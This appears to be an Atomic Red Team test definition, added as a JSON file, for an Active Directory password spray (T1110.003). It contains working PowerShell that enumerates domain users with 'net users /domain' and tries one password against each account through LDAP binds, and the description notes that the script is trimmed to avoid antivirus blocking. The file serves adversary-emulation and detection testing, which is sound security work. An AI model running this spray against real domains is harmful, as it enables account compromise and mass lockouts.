@@ -1,0 +1,92 @@
+{
+  "id": "b15bc9a5-a4f3-4879-9304-ea0011ace63a",
+  "name": "Password Spray Invoke-DomainPasswordSpray Light",
+  "description": "Perform a domain password spray using the same core method of the [DomainPasswordSpray tool](https://github.com/dafthack/DomainPasswordSpray) \nbut without all the extra code that makes the script get blocked by many AVs. \nThis atomic test will attempt a single password against all users in a password list at $env:Temp\\usersdpsLight.txt. You can create this file manually\nor with the automated prereq_command. The prereq_command will limit the user list to 200 users by default to help you avoid massive account lockout.\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "82a0cc5b-c6a6-4361-9d55-6e8f3d4f1e7b",
+      "type": "execute-command",
+      "data": {
+        "command": "function Invoke-dpsLight ($Password, $userlist) {\n$users = Get-Content $userlist\n$Domain = \"LDAP://\" + ([ADSI]\"\").distinguishedName\nforeach ($User in $users) {\n  $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain, $User, $Password)\n  if ($Domain_check.name -ne $null) {\n    Write-Host -ForegroundColor Green \"Password found for User:$User Password:$Password\"\n  }\n  else { Write-Host \". \" -NoNewline}\n}\nWrite-Host -ForegroundColor green \"Finished\"\n}\nInvoke-dpsLight \"#{password}\" $env:Temp\\usersdpsLight.txt\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "744dc2ad-270e-4e64-b5f5-6b4c65b6c160",
+      "name": "Check dependency 1/1",
+      "description": "Username file must exist at $env:Temp\\usersdpsLight.txt\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path  $env:Temp\\usersdpsLight.txt) {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "60bade72-7f44-4dac-aa57-2d1e9955f52c",
+      "name": "Resolve dependency 1/1",
+      "description": "Username file must exist at $env:Temp\\usersdpsLight.txt\n",
+      "type": "execute-command",
+      "data": {
+        "command": "Write-Host -NoNewLine \"Reading Users.\" # this code modifed from https://github.com/ZoomerHulkHogan/Powershell-Domain-User-Enumeration\n$netOutput = net users /domain\n$netOutput = [System.Collections.ArrayList]($netOutput[6..($netOutput.length-3)])\n$userLimit = #{user_limit}; $usercount = 0\nforeach ($line in $netOutput) {\n  if($usercount -ge $userLimit){break}\n  $line = $line.trim()\n  $line = $line -split '\\s\\s+'\n  foreach ($user in $line){\n    if($usercount -ge $userLimit){break}\n    Add-Content $env:Temp\\usersdpsLight.txt $user\n    $usercount = $usercount + 1\n    }  \n}\nWrite-Host \"Usernames saved to $env:Temp\\usersdpsLight.txt\"\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "55be7aa7-f19a-49b5-bd7a-8baba8f55635",
+      "name": "Re-check dependency 1/1",
+      "description": "Username file must exist at $env:Temp\\usersdpsLight.txt\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path  $env:Temp\\usersdpsLight.txt) {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "744dc2ad-270e-4e64-b5f5-6b4c65b6c160",
+      "p": "on-success",
+      "o": "82a0cc5b-c6a6-4361-9d55-6e8f3d4f1e7b"
+    },
+    {
+      "s": "744dc2ad-270e-4e64-b5f5-6b4c65b6c160",
+      "p": "on-failure",
+      "o": "60bade72-7f44-4dac-aa57-2d1e9955f52c"
+    },
+    {
+      "s": "60bade72-7f44-4dac-aa57-2d1e9955f52c",
+      "p": "on-success",
+      "o": "55be7aa7-f19a-49b5-bd7a-8baba8f55635"
+    },
+    {
+      "s": "55be7aa7-f19a-49b5-bd7a-8baba8f55635",
+      "p": "on-failure",
+      "o": "82a0cc5b-c6a6-4361-9d55-6e8f3d4f1e7b"
+    }
+  ],
+  "tags": [
+    "T1110.003",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "user_limit",
+      "type": "integer",
+      "description": "The max number of users to put in the list when running the prereq_command",
+      "value": "200"
+    },
+    {
+      "name": "password",
+      "type": "string",
+      "description": "The password to try for each user in users.txt",
+      "value": "Spring2020"
+    }
+  ]
+}
